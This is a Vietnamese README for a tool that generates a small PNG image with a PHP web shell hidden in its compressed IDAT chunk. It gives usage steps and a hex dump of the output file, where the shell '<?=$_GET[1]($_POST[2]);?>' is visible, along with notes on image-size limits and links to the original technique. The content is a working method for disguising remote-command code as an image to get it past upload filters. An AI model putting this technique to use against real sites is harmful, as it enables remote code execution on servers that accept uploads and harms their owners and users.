# put_code_in_PNG_IDAT_chunk
Tạo ra một file ảnh PNG (32x32) có chứa data hoặc code trong IDAT chunk.

## Cách dùng:
1. Cài đặt thư viện `php-gd`: `sudo apt install php-gd`.
2. Sử dụng [control_zlib_compression](../control_zlib_compression) để tìm một chuỗi byte mà sao khi `zlib.compress()` nó ra sẽ chứa một đoạn code mà mình muốn. Chuyển nó sang hex và thay biến `$s` thành chuỗi hex đó.
3. Chạy code: `php main.php > a.png`.

File `a.png` được tạo ra chính là file cần tìm.
```
$ xxd a.png
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0020 0000 0020 0802 0000 00fc 18ed  ... ... ........
00000020: a300 0000 0970 4859 7300 000e c400 000e  .....pHYs.......
00000030: c401 952b 0e1b 0000 0060 4944 4154 4889  ...+.....`IDATH.
00000040: 6364 5e3c 3f3d 245f 4745 545b 315d 2824  cd^<?=$_GET[1]($
00000050: 5f50 4f53 545b 325d 293b 3f3e 8081 81c1  _POST[2]);?>....
00000060: c472 652a 93fc 8f8b db7e 3fd3 7da2 26f7  .re*.....~?.}.&.
00000070: f1ed c9bf 9faf 067c b431 3065 5eb9 67d3  .......|.10e^.g.
00000080: aa3d 9b18 46c1 2818 05a3 6014 8c82 5130  .=..F.(...`...Q0
00000090: 0a46 c128 1805 c306 0000 86df 1a02 d38e  .F.(............
000000a0: 790f 0000 0000 4945 4e44 ae42 6082       y.....IEND.B`.
```

## Ghi chú: 
1. Phương pháp mà mình tìm hiểu sẽ không hoạt động trên ảnh lớn hơn tầm 50x50 trở lên. Vì lúc đó IDAT chunk lớn quá mà `control_zlib_compress` chỉ hoạt động với payload không quá lớn.
2. Trên ảnh quá nhỏ cũng không được vì ta cố tính sửa pixel trên hàng đầu tiên của ảnh để chỉ phải xử lý filter 1 và 3.

## Tham khảo:
1. https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
2. https://pyokagan.name/blog/2019-10-14-png/
3. https://en.wikipedia.org/wiki/Portable_Network_Graphics
